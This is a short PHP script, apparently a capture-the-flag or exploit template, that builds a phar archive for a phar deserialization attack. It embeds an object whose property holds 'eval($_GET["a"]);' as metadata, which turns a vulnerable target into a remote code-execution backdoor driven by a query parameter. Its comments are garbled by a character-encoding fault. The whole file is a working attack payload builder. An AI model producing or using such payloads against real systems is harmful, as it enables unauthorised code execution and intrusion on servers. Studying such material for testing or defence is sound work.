<?php
highlight_file(__FILE__);
class Testobj
{
    var $output='';     //����ʱ��Ҫ�䶯�ĵط�����������Ŀ������Ҫ�䶯�ĵط���ʲô
}

@unlink('test.phar');   //ɾ��֮ǰ��test.phar�ļ�(�����)
$phar=new Phar('test.phar');  //����һ��phar�����ļ���������pharΪ��׺
$phar->startBuffering();  //��ʼд�ļ�
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //д��stub
$o=new Testobj();
$o->output='eval($_GET["a"]);';     //����ʱ��Ҫ�䶯�ĵط�����������Ŀ��Ҫʵ�����Ķ�����ʲô
$phar->setMetadata($o);//д��meta-data
$phar->addFromString("test.txt","test");  //���Ҫѹ�����ļ�
$phar->stopBuffering();
?>
